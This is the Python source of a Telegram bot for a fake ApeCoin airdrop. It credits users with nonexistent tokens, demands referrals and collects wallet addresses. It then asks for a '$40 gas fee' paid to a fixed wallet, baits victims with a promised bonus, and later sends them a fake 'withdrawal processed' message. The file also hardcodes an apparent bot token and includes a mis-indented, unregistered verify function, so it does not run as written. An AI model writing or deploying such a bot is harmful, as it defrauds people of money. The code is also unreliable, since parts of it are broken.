# ================================
# ApeCoin Airdrop Telegram Bot
# Compatible with Pydroid 3 + Render
# ================================

import os
import sqlite3
import datetime
import logging
import asyncio
import aiohttp
import time
import traceback
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# --- CONFIGURATION ---
TOKEN = os.environ.get("TOKEN", "7768496688:AAGgto_Wv2qiq6_L5LrvzbYEXXptfWu7pw0")           # BotFather token
ADMIN_ID = int(os.environ.get("ADMIN_ID", 7427661322))                      # Your TeleD

GROUP_LINK = os.environ.get("GROUP_LINK", "https://t.me/Apecoingroupchat")
CHANNEL_LINK = os.environ.get("CHANNEL_LINK", "https://t.me/Apetelegramchannel")
SUPPORT_LINK = os.environ.get("SUPPORT_LINK", "https://t.me/ApeCoinSuppot")

BNB_FEE_WALLET = os.environ.get("BNB_FEE_WALLET", "0x614d8bdc87607ed477b14f8d69ff02259bb435cb")
ETH_FEE_WALLET = os.environ.get("ETH_FEE_WALLET", "0x614d8bdc87607ed477b14f8d69ff02259bb435cb")
USDT_BNB = os.environ.get("USDT_BNB", "0x614d8bdc87607ed477b14f8d69ff02259bb435cb")
USDT_ETH = os.environ.get("USDT_ETH", "0x614d8bdc87607ed477b14f8d69ff02259bb435cb")

RENDER_URL = os.getenv("RENDER_URL", "https://apecoinairdropbot-d170.onrender.com")

airdrop_bonus = 1000
ref_bonus = 200

withdraw_year = 2025
withdraw_month = 10
withdraw_day = 31
withdraw_date = datetime.date(withdraw_year, withdraw_month, withdraw_day)

# --- LOGGING ---
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# --- DATABASE ---
conn = sqlite3.connect("airdrop.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute("""
CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    firstname TEXT,
    username TEXT,
    wallet TEXT,
    balance INTEGER DEFAULT 0,
    referrals INTEGER DEFAULT 0,
    step TEXT DEFAULT 'verify'
)
""")
conn.commit()

# --- DATABASE HELPERS ---
def get_user(user_id):
    cursor.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
    return cursor.fetchone()

def add_user(user_id, firstname):
    if not get_user(user_id):
        cursor.execute("INSERT INTO users (user_id, firstname, balance) VALUES (?, ?, ?)", (user_id, firstname, 0))
        conn.commit()

def update_user(user_id, field, value):
    cursor.execute(f"UPDATE users SET {field}=? WHERE user_id=?", (value, user_id))
    conn.commit()

def get_all_users():
    cursor.execute("SELECT user_id FROM users")
    return [row[0] for row in cursor.fetchall()]

# --- COMMAND: /start ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    firstname = update.effective_user.first_name
    add_user(user_id, firstname)

    # Add referral bonus
    if context.args:
        try:
            ref_id = int(context.args[0])
            if ref_id != user_id and get_user(ref_id):
                ref_data = get_user(ref_id)
                new_balance = ref_data[4] + ref_bonus
                new_refs = ref_data[5] + 1
                update_user(ref_id, "balance", new_balance)
                update_user(ref_id, "referrals", new_refs)
        except:
            pass

    await update.message.reply_text(
        f"👋 Hello {firstname}!\n\n"
        f"To join the airdrop:\n"
        f"1️⃣ Join our group: {GROUP_LINK}\n"
        f"2️⃣ Join our channel: {CHANNEL_LINK}\n\n"
       f"Send an amazing message to our group(e.g. apecoin to the moon)\n\n"
        "Then send me your Telegram username (e.g. @yourname)."
    )

# --- HANDLE MESSAGES ---
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    user = get_user(user_id)
    if not user:
        return

    step = user[6]

    if step == "verify":
        update_user(user_id, "username", text)
        update_user(user_id, "step", "wallet")
        await update.message.reply_text("✅ Thanks! Now send your *Ethereum wallet address*:", parse_mode="Markdown")

    elif step == "wallet":
        update_user(user_id, "wallet", text)
        update_user(user_id, "balance", airdrop_bonus)
        update_user(user_id, "step", "done")

        keyboard = [
            [InlineKeyboardButton("💰 Balance", callback_data="balance"),
             InlineKeyboardButton("ℹ️ Info", callback_data="info")],
            [InlineKeyboardButton("👥 Referral", callback_data="referral"),
             InlineKeyboardButton("💸 Withdraw", callback_data="withdraw")],
            [InlineKeyboardButton("👤 Support", callback_data="support")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await update.message.reply_text(
            f"🎉 Welcome! You received {airdrop_bonus} $ApeCoin (~$500).\n\nUse the menu below:",
            reply_markup=reply_markup
        )

# --- BUTTON HANDLER ---
async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    user = get_user(user_id)
    if not user:
        return

    firstname, username, wallet, balance, referrals, step = user[1], user[2], user[3], user[4], user[5], user[6]
    referral_balance = max(balance - airdrop_bonus, 0)
    full_balance = airdrop_bonus + referral_balance
    reflink = f"https://t.me/{context.bot.username}?start={user_id}"

    data = query.data

    if data == "balance":
        msg = (
            f"👤 Hello {firstname}\n\n"
            f"🏆 Airdrop Balance: {airdrop_bonus} $ApeCoin\n"
            f"🎁 Referral Balance: {referral_balance} $ApeCoin\n"
            f"👩‍👦‍👦 Referrals: {referrals}\n\n"
            f"💰 Full Balance: {full_balance} $ApeCoin\n\n"
            f"🗓️ Withdrawals open: {withdraw_date.strftime('%d %B %Y')}\n"
            f"⚠️ Need 7 referrals to withdraw.\n\n"
            f"🔗 Referral link:\n[Click here to invite friends]({reflink})"
        )
        await query.edit_message_text(msg, parse_mode="MarkdownV2", disable_web_page_preview=True)

    elif data == "info":
        msg = (
            "ℹ️ *Airdrop Info*\n\n"
            f"✅ Signup Bonus: {airdrop_bonus} $ApeCoin (~$500)\n"
            f"👥 Referral Reward: {ref_bonus} $ApeCoin (~$100)\n"
            f"💸 Withdrawals: {withdraw_date.strftime('%d %B %Y')}\n"
           "🎁 *First 3,000 users to withdraw will receive an additional $50 bonus from the Network Chain!*\n\n"
            "🚀 Keep inviting friends!"
        )
        await query.edit_message_text(msg, parse_mode="MarkdownV2")

    elif data == "referral":
        msg = (
            f"👥 Your referral link:\n"
            f"[Click here to invite friends]({reflink})\n\n"
            f"Earn {ref_bonus} $ApeCoin per friend!"
        )
        await query.edit_message_text(msg, parse_mode="MarkdownV2")

    elif data == "support":
        today = datetime.date.today()
        if today <= withdraw_date + datetime.timedelta(days=3):
            msg = (
                f"👋 Hello {firstname}, we're excited to have you here!\n\n"
                f"💰 Your current balance: {full_balance} $ApeCoin\n\n"
                f"🗓️ Withdrawals will open after {withdraw_date.strftime('%d %B %Y')}.\n\n"
                "🎁 *First 3,000 users to withdraw will receive an additional $50 bonus from the Network Chain!*\n\n"
                f"👉 [Message Support]({SUPPORT_LINK})"
            )
        else:
            msg = (
                "👤 *Support Center*\n\n"
                "If you have any problem with:\n\n"
                "- Paying withdrawal gas fee\n"
                "- Want to pay with other coins\n"
                "- Receiving ApeCoin Airdrop tokens\n"
                "- Swapping ApeCoin tokens\n"
                "- Transferring ApeCoin tokens\n\n"
                f"👉 [Message Support]({SUPPORT_LINK})"
            )
        await query.edit_message_text(msg, parse_mode="Markdown", disable_web_page_preview=True)

    elif data == "withdraw":
        today = datetime.date.today()
        if today < withdraw_date:
            await query.edit_message_text(f"⚠️ Withdrawals locked until {withdraw_date.strftime('%d %B %Y')}")
        else:
            update_user(user_id, "step", "withdraw_amount")
            await query.edit_message_text("💸 Enter the *amount of $ApeCoin* to withdraw:", parse_mode="Markdown")

# --- WITHDRAW FLOW ---
async def withdraw_flow(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    user = get_user(user_id)
    if not user:
        return

    step = user[6]

    if step == "withdraw_amount":
        update_user(user_id, "username", text)
        update_user(user_id, "step", "withdraw_wallet")
        await update.message.reply_text("✅ Now send your *Ethereum wallet address* again:", parse_mode="Markdown")

    elif step == "withdraw_wallet":
        update_user(user_id, "wallet", text)
        update_user(user_id, "step", "done")
        await update.message.reply_text(
            f"⚠️ Due to high charges for Ethereum gas fees, please pay *$40 gas fee* to complete withdrawal:\n\n"
            f"🔹 BNB (BEP20): `{BNB_FEE_WALLET}`\n"
            f"🔹 ETH (ERC20): `{ETH_FEE_WALLET}`\n"
            f"🔹 USDT (BNB): `{USDT_BNB}`\n"
            f"🔹 USDT (ETH): `{USDT_ETH}`\n\n"
            f"⚠️ Note immediately after you pay your gas fee, you will receive a bounce back bonus of an additional $50 from the Network if only you are among the first 3,000 users to withdraw your token and also that is to verify that our first 3,000 users and other users are not robots , thank you:\n\n"
            "After payment is verified by the Network chain, withdrawal tokens will process  *immediately* ⏳",
            parse_mode="Markdown" 
        )
           # Notify admin privately
        bot = context.bot
        msg = (
            f"⚠️ *Withdrawal Request*\n\n"
            f"👤 User: [{user_id}](tg://user?id={user_id})\n"
            f"💰 Amount: {user[4]} $ApeCoin\n"
            f"🏦 Wallet: `{text}`\n\n"
            f"Use /verify {user_id} to mark verified and notify user."
        )
        await bot.send_message(chat_id=ADMIN_ID, text=msg, parse_mode="Markdown")

        await update.message.reply_text(
            "✅ Withdrawal request submitted successfully!\n"
            "Our team will review and verify your transaction soon."
        )

# --- ADMIN STATS ---
async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return await update.message.reply_text("❌ Not authorized")

    cursor.execute("SELECT COUNT(*) FROM users")
    total_users = cursor.fetchone()[0]

    cursor.execute("SELECT SUM(referrals) FROM users")
    total_refs = cursor.fetchone()[0] or 0

    cursor.execute("SELECT SUM(balance) FROM users")
    total_balance = cursor.fetchone()[0] or 0

    msg = (
        f"📊 Bot Stats:\n"
        f"👥 Total Users: {total_users}\n"
        f"👥 Total Referrals: {total_refs}\n"
        f"💰 Total Distributed: {total_balance} $ApeCoin"
    )
    await update.message.reply_text(msg)

# --- ADMIN BROADCAST ---
async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        await update.message.reply_text("🚫 You are not authorized to use this command.")
        return

    if not context.args:
        await update.message.reply_text("Usage: /broadcast <message>")
        return

    message_text = " ".join(context.args)
    users = get_all_users()
    count = 0
    for uid in users:
        try:
            await context.bot.send_message(chat_id=uid, text=message_text)
            count += 1
        except:
            pass

    await update.message.reply_text(f"✅ Broadcast sent to {count} users.")
    
    # --- ADMIN COMMAND: /send (private message to a user) ---
async def send_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return await update.message.reply_text("🚫 You are not authorized to use this command.")
    if len(context.args) < 2:
        return await update.message.reply_text("Usage: /send <user_id> <message>")

    try:
        target_id = int(context.args[0])
        message_text = " ".join(context.args[1:])
        await context.bot.send_message(chat_id=target_id, text=message_text)
        await update.message.reply_text(f"✅ Message sent to user {target_id}.")
    except Exception as e:
        await update.message.reply_text(f"⚠️ Failed to send message: {e}")
        
        #---ADMIN VERIFY: /verify <user_id>---
        async def verify(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
         await update.message.reply_text("🚫 Not authorized")
		return
		
    if not context.args:
        return await update.message.reply_text("Usage: /verify <user_id>")
    try:
        uid = int(context.args[0])
        await context.bot.send_message(chat_id=uid,
                                       text="✅ Your withdrawal has been verified and processed successfully!")
        await update.message.reply_text(f"✅ User {uid} notified of verification.")
    except Exception as e:
        await update.message.reply_text(f"⚠️ Error verifying user: {e}")

# --- KEEP-ALIVE & PING ---
RENDER_URL = "https://apecoinairdropbot-d170.onrender.com"  # Replace after deployment

async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("✅ Bot is alive and running!")

async def keep_alive():
    while True:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(RENDER_URL) as resp:
                    print(f"🔄 Keep-alive ping: {resp.status}")
        except Exception as e:
            print(f"⚠️ Keep-alive error: {e}")
        await asyncio.sleep(300)

# --- SETUP BOT ---
app = Application.builder().token(TOKEN).build()
app.add_handler(CommandHandler("start", start))
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
app.add_handler(CallbackQueryHandler(button))
app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, withdraw_flow))
app.add_handler(CommandHandler("stats", stats))
app.add_handler(CommandHandler("broadcast", broadcast))
app.add_handler(CommandHandler("ping", ping))

# --- RUN BOT ---
async def notify_admin(bot, message):
    try:
        await bot.send_message(chat_id=ADMIN_ID, text=message)
    except:
        pass

def run_bot():
    while True:
        try:
            print("🤖 Bot is starting...")
            try:
                asyncio.get_running_loop()
            except RuntimeError:
                asyncio.set_event_loop(asyncio.new_event_loop())

            loop = asyncio.get_event_loop()
            loop.run_until_complete(notify_admin(app.bot, "✅ Bot started successfully and is now online."))
            loop.create_task(keep_alive())
            app.run_polling()
        except Exception as e:
            error_message = f"[{datetime.datetime.now()}] Error: {e}\n{traceback.format_exc()}\n\n"
            with open("bot_errors.log", "a", encoding="utf-8") as f:
                f.write(error_message)
            try:
                loop = asyncio.get_event_loop()
                loop.run_until_complete(notify_admin(app.bot, f"⚠️ Bot crashed with error:\n{e}"))
            except:
                pass
            print("⚠️ Bot crashed! Restarting in 10 seconds...")
            time.sleep(10)
        else:
            print("✅ Bot stopped gracefully.")
            break

if __name__ == "__main__":
    run_bot()
